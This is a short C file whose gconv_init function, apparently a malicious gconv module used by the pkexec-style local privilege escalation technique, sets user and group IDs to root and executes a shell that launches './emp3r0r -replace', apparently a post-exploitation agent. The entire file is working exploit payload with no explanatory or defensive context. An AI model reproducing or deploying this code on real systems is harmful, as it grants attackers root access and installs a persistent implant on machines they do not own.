#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv()
{
    return;
}

void gconv_init()
{
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);
    static char* a_argv[] = { "sh", "-c", "./emp3r0r -replace", NULL };
    static char* a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
    execve("/bin/sh", a_argv, a_envp);
    exit(0);
};
